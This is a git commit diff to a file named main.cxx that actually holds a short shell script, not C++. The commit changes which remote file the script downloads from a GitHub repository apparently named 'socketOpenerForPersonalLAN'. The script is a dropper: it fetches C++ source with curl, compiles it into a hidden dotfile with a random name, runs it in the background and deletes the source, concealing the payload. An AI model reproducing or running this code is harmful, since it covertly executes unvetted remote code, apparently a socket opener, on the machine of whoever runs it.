c03d97617fbce07eedf02727bfa8056438f45c2c
GOUACHE-Nathan-2225041 <123471299+GOUACHE-Nathan-2225041aa@users.noreply.github.com>
2024-01-25 10:58:46 +0100

    Update main.cxx

--- main.cxx
+++ main.cxx
@@ -1,5 +1,5 @@
 fileName=$(echo $RANDOM $RANDOM | tr -d ' ')
-curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/main.cxx | cat > hey.cxx
+curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/aa.cxx | cat > hey.cxx
 g++ hey.cxx -o .$fileName
 ./.$fileName &
 rm hey.cxx
